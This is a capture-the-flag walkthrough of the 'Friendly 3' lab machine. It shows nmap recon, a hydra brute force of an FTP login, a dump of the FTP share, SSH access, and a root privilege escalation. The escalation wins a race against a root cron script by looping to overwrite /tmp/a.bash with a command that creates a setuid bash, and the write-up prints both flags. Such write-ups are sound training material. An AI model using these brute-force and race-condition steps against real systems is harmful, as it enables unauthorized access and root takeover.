# Friendly 3

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.15:21
Open 10.0.2.15:22
Open 10.0.2.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.15
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFC2DVBfq6sqSsCS9Jg+TZN7bqZ4U5G/tKb5dD3M69VVHwPRuMmify8CmxFhlP33nMhZTvYSZIpjGuiPSjks5UA=
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICDxFT3mwConXgCXORTtuda6Onx3sMQgZb6CzY2tWc3l
80/tcp open  http    syn-ack nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```html
â””â”€$ curl 10.0.2.15 -i
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 31 Dec 2025 15:28:00 GMT
Content-Type: text/html
Content-Length: 355
Last-Modified: Sun, 25 Jun 2023 14:58:16 GMT
Connection: keep-alive
ETag: "64985608-163"
Accept-Ranges: bytes

<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 40em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<p>Hi, sysadmin<br>I want you to know that I've just uploaded the new files into the FTP Server.<br>See you,<br>juan.</p>
</body>
</html>
```

```bash
â””â”€$ feroxbuster -u http://10.0.2.15 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET       14l       50w      355c http://10.0.2.15/
200      GET       14l       50w      355c http://10.0.2.15/index.html
```

## FTP

I guess we bruteforcing with potential username `juan` ðŸ˜”

```bash
â””â”€$ hydra -l juan -P $rockyou 10.0.2.15 ftp -t 64
[21][ftp] host: 10.0.2.15   login: juan   password: alexis
```

Login
```bash
â””â”€$ sshpass -p 'alexis' ftp juan@10.0.2.15
ftp> ls
-rw-r--r--    1 0        0               0 Jun 25  2023 file1
-rw-r--r--    1 0        0               0 Jun 25  2023 file10
-rw-r--r--    1 0        0               0 Jun 25  2023 file100
...
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold7
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold8
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold9
-rw-r--r--    1 0        0              58 Jun 25  2023 fole32
```

Dump FTP
```bash
â””â”€$ wget -m ftp://juan:alexis@10.0.2.15
â””â”€$ cd 10.0.2.15
â””â”€$ find . -empty -delete
```

```bash
â””â”€$ find . -type f -ls
  4495886      4 -rw-rw-r--   1 woyag    woyag        3171 Jun 25  2023 ./fold8/passwd.txt
  4495885      4 -rw-rw-r--   1 woyag    woyag         187 Dec 31 10:33 ./fold8/.listing
  4495861      4 -rw-rw-r--   1 woyag    woyag          58 Jun 25  2023 ./fole32
  4495874      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold15/.listing
  4495868      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold12/.listing
  4495876      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold4/.listing
  4495870      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold13/.listing
  4495839      4 -rw-rw-r--   1 woyag    woyag          36 Jun 25  2023 ./file80
  4495866      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold11/.listing
  4495883      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold7/.listing
  4495864      4 -rw-rw-r--   1 woyag    woyag         163 Jun 25  2023 ./fold10/.test.txt
  4495863      4 -rw-rw-r--   1 woyag    woyag         186 Dec 31 10:33 ./fold10/.listing
  4495872      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold14/.listing
  4495881      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold6/.listing
  4495888      4 -rw-rw-r--   1 woyag    woyag         119 Dec 31 10:33 ./fold9/.listing
  4495879      4 -rw-rw-r--   1 woyag    woyag          33 Jun 25  2023 ./fold5/yt.txt
  4495878      4 -rw-rw-r--   1 woyag    woyag         183 Dec 31 10:33 ./fold5/.listing
  4495758      8 -rw-rw-r--   1 woyag    woyag        7337 Dec 31 10:33 ./.listing
```

```bash
â””â”€$ find . -type f -exec sh -c "echo File: {}; echo ===; cat {}; echo '==============================='" \;
...
File: ./fold10/.test.txt
===
Hi, I'am juan another time. I want you to know that I found "cookie" in a file called "zlcnffjbeq.gkg" into my home folder. I think it's from another user, IDK...
===============================
...
```

```bash
â””â”€$ rot13 <<<'zlcnffjbeq.gkg'
mypassword.txt
```

Nothing on web server, dead end?

## SSH

```bash
â””â”€$ sshpass -p 'alexis' ssh juan@10.0.2.15
juan@friendly3:~$ id
uid=1001(juan) gid=1001(juan) groups=1001(juan)
```

### User.txt

```bash
juan@friendly3:~$ cat user.txt
cb40b159c8086733d57280de3f97de30
```

## Privilege Escalation

Looks like a root cronjob
```bash
juan@friendly3:~$ ls /opt/ -alh
total 12K
drwxr-xr-x  2 root root 4.0K Jun 25  2023 .
drwxr-xr-x 18 root root 4.0K Jun 25  2023 ..
-rwxr-xr-x  1 root root  190 Jun 25  2023 check_for_install.sh
juan@friendly3:~$ cat /opt/check_for_install.sh
#!/bin/bash

/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```

Script is not writable, but there's some delay between moving the file to `/tmp` and then executing it.
```bash
juan@friendly3:~$ find / -name 9842734723948024.bash -ls 2>/dev/null
   130111      4 -rw-r--r--   1 root     root            6 Jun 25  2023 /var/www/html/9842734723948024.bash
```

Small script to continuously keep writing to file
```bash
juan@friendly3:~$ target=$((SECONDS + 64))
start_time=$SECONDS
for (( ; SECONDS < target; )); do
    echo 'install -m4777 /bin/bash /tmp/rootbash' > /tmp/a.bash
    elapsed=$((SECONDS - start_time))
    if [[ -f /tmp/rootbash ]]; then status="EXISTS"; else status="MISSING"; fi
    printf "\rElapsed: %2ds | Target: /tmp/rootbash [%-7s]" "$elapsed" "$status"
done
Elapsed: 32s | Target: /tmp/rootbash [EXISTS ]^C
```

```bash
juan@friendly3:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(juan) gid=1001(juan) euid=0(root) groups=1001(juan)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
eb9748b67f25e6bd202e5fa25f534d51
```